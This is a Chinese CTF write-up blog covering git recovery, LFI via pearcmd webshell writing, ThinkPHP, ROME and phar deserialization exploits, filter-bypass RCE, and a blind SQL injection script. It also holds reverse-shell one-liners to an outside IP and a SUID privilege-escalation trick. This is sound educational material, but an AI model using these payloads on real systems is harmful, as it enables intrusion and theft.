-F:* 解压路径</code>得到</p><p><img src="/../images/image-20221020131537014-1686150281425.png" alt="image-20221020131537014"></p><p>flag在flag.txt中</p><p>js脚本</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);e7926b8de13327f8e703624e.<span class="property">Run</span> (<span class="string">&quot;cmd /c mkdir %tmp%\\flag&amp;&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&amp;\&quot;%tmp%\\strange2.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Yesec-no-drumsticks-5"><a href="#Yesec-no-drumsticks-5" class="headerlink" title="Yesec no drumsticks 5"></a>Yesec no drumsticks 5</h3><h4 id="git工作原理"><a href="#git工作原理" class="headerlink" title="git工作原理"></a>git工作原理</h4><img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" /><ul><li>workspace：工作区–本地目录（比如我<code>git init Test</code>创建了一个空仓库，那么<code>Test</code>这个目录就是workspace）</li><li>staging area：暂存区&#x2F;缓存区–.git目录下的index文件（<code>git add</code> 或者<code>git stash</code>）</li><li>local repository：版本库或本地仓库–.git目录下的objects目录</li><li>remote repository：远程仓库–github</li></ul><p>以本题为例，其<code>.git</code>目录如下</p><p><img src="/../images/image-20221020162618015-1686150281425.png" alt="image-20221020162618015"></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><img src="/../images/image-20221020163752820-1686150281425.png" alt="image-20221020163752820"></p><p>index中有flag.txt文件</p><p>恢复缓存工作区<code>git stash pop</code></p><p><img src="/../images/image-20221020163917173-1686150281426.png" alt="image-20221020163917173"></p><p>回滚<code>git reset --hard commit_id</code>后，读取flag.txt得到<code>flag&#123;Yesec#1s#c@ibi&#125;</code></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>源码泄露</p><ol><li><p>git回滚</p><p>查看历史版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>回滚到历史版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure><blockquote><p>实际上就是将HEAD指向commit_id</p></blockquote></li><li><p>git缓存</p><p>将当前工作区缓存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><p>恢复缓存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>回滚到缓存版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ezapi"><a href="#ezapi" class="headerlink" title="ezapi"></a>ezapi</h4><p>graphql</p><p>漏洞：<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>使用语法：<a href="https://blog.csdn.net/weixin_39130261/article/details/118547853">https://blog.csdn.net/weixin_39130261/article/details/118547853</a></p><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地文件包含（LFI）绕过后缀名添加，使用pearcmd.php绕过。</p><p>p神的文章：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p><blockquote><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。(类似于python中的pip)在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>pear中有一个命令config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>然后一句话木马就会被写入&#x2F;tmp&#x2F;hello.php中，我们只需包含这个文件即可。</p><h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>5.1.41LTS ThinkPHP框架反序列化漏洞<a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>这道题反序列化点在cookie中</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:</span><br><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;id=whoami</span><br><span class="line">    </span><br><span class="line">?dajs=ls</span><br></pre></td></tr></table></figure><p>flag在环境变量里。</p><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了很多。主要是</p><ul><li><p>关键词绕过</p><p>通配符，插入空字符绕过等等</p></li><li><p>；绕过</p><p>%0a或者&amp;&amp;绕过</p></li><li><p>&#x2F;绕过</p><p><code>ls /</code> &#x3D;&#x3D; <code>cd 路径；ls</code></p><p>返回上级目录 <code>cd ..</code></p></li><li><p>空格绕过</p><p><code>$&#123;IFS&#125;</code>等等</p></li></ul><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=cd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>aca$<span class="number">1</span>t$&#123;IFS&#125;ffff$<span class="number">1</span>llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>unicode编码绕过，catch_warnings被过滤，换一个类比如os._wrap_close就好了。</p><h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>考点：phar反序列化，#绕过</p><p>文件上传给出上传后文件路径</p><p>注释中提示class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>#绕过</p><ol><li>闭合php标签</li><li>\n</li><li>\r</li></ol><p>这里只能用\r。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;\rsystem(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的phar改图片后缀名上传后，在class.php下用phar协议访问（只要是phar文件，后缀名是什么都可以解析）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">class</span>.php?file=phar:<span class="comment">//file_path</span></span><br></pre></td></tr></table></figure><h4 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h4><p>0^0和0^1，回显两种情况，猜测使用盲注。</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数字</span></span><br><span class="line"><span class="comment">#0^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)</span></span><br><span class="line"><span class="comment">#单引号</span></span><br><span class="line"><span class="comment">#0&#x27; or (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SqlBlind</span>():</span><br><span class="line"></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line"><span class="comment">#wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment">#where(user=&#x27;f1ag_is_here&#x27;)</span></span><br><span class="line">            params=&#123;</span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;c&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;comment&#x27;:&quot;hack&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_information&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                 <span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 请求方式</span></span><br><span class="line">            <span class="comment">#r=requests.get(url=url,params=params)</span></span><br><span class="line">            r=requests.post(url=url,data=params)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 防止429</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#r=requests.get(url=url2)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 编码</span></span><br><span class="line">            <span class="comment">#r=str(r.json())</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># True的标志  0的个数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;好耶&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># if r.text.count(&#x27;0&#x27;)==i:</span></span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line"></span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &lt;=<span class="number">32</span> <span class="keyword">or</span> right &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>,result)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    SqlBlind()</span><br></pre></td></tr></table></figure><h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/*    */</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerController</span></span><br><span class="line"><span class="comment">/*    */</span> &#123;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 19 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do you like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">(<span class="meta">@RequestParam</span> String EXP)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">/* 24 */</span>     <span class="keyword">if</span> (EXP.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">/* 25 */</span>       <span class="keyword">return</span> <span class="string">&quot;Do you know Rome Serializer?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/* 27 */</span>     <span class="type">byte</span>[] exp = Base64.getDecoder().decode(EXP);</span><br><span class="line"><span class="comment">/* 28 */</span>     <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line"><span class="comment">/* 29 */</span>     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">/* 30 */</span>     objectInputStream.readObject();</span><br><span class="line"><span class="comment">/* 31 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do You like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span> &#125;</span><br></pre></td></tr></table></figure><p>反序列化点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>ROME反序列化分析</p><p><a href="https://www.yulate.com/292.html">https://www.yulate.com/292.html</a></p><blockquote><p>java版本要jdk8u-121照着文章本地复现了，但是用ysoserial写了反弹shell，题目的发送过去不可以</p></blockquote><p>这周发现只要把payload拿去url编码后就可以了。</p><p>这里思考了得出的结果是</p><blockquote><p>RFC3986中指定了以下字符为保留字符：! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>　　不安全字符：还有一些字符，当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符，原因有很多。</p><ul><li>空格：Url 在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。</li><li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔Url的作用</li><li>#：通常用于表示书签或者锚点</li><li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码</li><li>{}|^[]&#96;~：某一些网关或者传输代理会篡改这些字符</li></ul></blockquote><p>而base64加密后可能会出现<code>+,/,=</code></p><p>解题步骤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>xxx为base64后的<code>bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</code></p><p>这里<code>&gt; 1.txt</code>是因为如果我加了<code>|base64</code>生成了之后会出现其他符号</p><p><img src="/../images/image-20221018174601257-1686150281426.png" alt="image-20221018174601257"></p><p>用python或者cyberchef来base64加密</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXP=对上面生成的base64再进行url编码</span><br></pre></td></tr></table></figure><p>连接后flag在根目录</p><p><img src="/../images/image-20221018174256886-1686150281426.png" alt="image-20221018174256886"></p><h3 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h3><h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>直接利用<code>&gt;</code>写入木马，然后一开始使用蚁剑连接</p><p>读取根目录下的start.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo $FLAG &gt; /ffll444aaggg &amp;&amp; export FLAG=not &amp;&amp; FLAG=not &amp;&amp; chmod 700 /ffll444aaggg &amp;&amp; \</span><br><span class="line">service apache2 restart &amp;&amp; \</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>这里<code>chmod 700 /ffll444aaggg</code>的意思就是&#x2F;ffll444aaggg只有root用户可以访问。</p><p>然后第一个想到的就是用suid提权，因为之前哪一周的misc是用到了这个知识点。</p><p>但是没有想到的是蚁剑的终端太不好用了（其实我之前觉得蚁剑挺强的，因为它自带那些绕过插件）</p><p>比如变量赋值没用</p><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019102635-1686150281426.png" alt="QQ图片20221019102635"></p><p>查找具有suid的命令没用</p><p><img src="/../images/image-20221019102841851-1686150281426.png" alt="image-20221019102841851"></p><p>反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@out:/$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/date</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line"></span><br><span class="line">www-data@out:/$ date -f ffll444aaggg</span><br><span class="line">date -f ffll444aaggg</span><br><span class="line">date: invalid date &#x27;flag&#123;1f005b40-39e2-4538-8816-3e27bdd98352&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019103452-1686150281426.png" alt="QQ图片20221019103452"></p><h4 id="final-round"><a href="#final-round" class="headerlink" title="final round"></a>final round</h4><p>时间盲注</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><p><input checked="" disabled="" type="checkbox"> BlueCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> SeaCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> DedeCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> ThinkPHP</p></li></ul><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p><a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>From <a href="https://www.anquanke.com/post/id/265092#h3-5">https://www.anquanke.com/post/id/265092#h3-5</a></p><ul><li>函数集文件，通常命名包含function或者common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</li><li>配置文件，通常命名中包括config关键字，配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是单引号还是用双引号括起来，如果是双引号可能就存在代码执行的问题了。</li><li>安全过滤文件，安全过滤文件对代码审计至关重要，这关系到我们挖掘到的可以点能否直接利用，通常命名中带有filter、safe、check等关键字，这类文件主要是对参数进行过滤，大多数的应用其实会在参数的输入做一下addslashes()函数的过滤。</li><li>index文件，index是一个程序的入口，所以通常我们只要读一读index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件有哪些。而不同目录的index文件也有不同的实现方式，建议最好将几个核心目录的index文件都通读一遍。</li></ul><h1 id="总结大致流程"><a href="#总结大致流程" class="headerlink" title="总结大致流程"></a>总结大致流程</h1><p><strong>1、先全局总览：入口文件、路由、全局处理方式等</strong><br><strong>2、定向功能审计：黑盒(找到敏感功能)+白盒（定位到代码进行审计）</strong><br><strong>3、敏感函数回溯</strong></p><p>先黑盒+白盒看敏感功能，再用自动化审计工具跑一遍并验证，最后再根据漏洞危险函数去回溯</p><h3 id="自动化审计工具"><a href="#自动化审计工具" class="headerlink" title="自动化审计工具"></a>自动化审计工具</h3><p>RIPS<a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p><p>seay</p><p>Fortify</p><h1 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h4 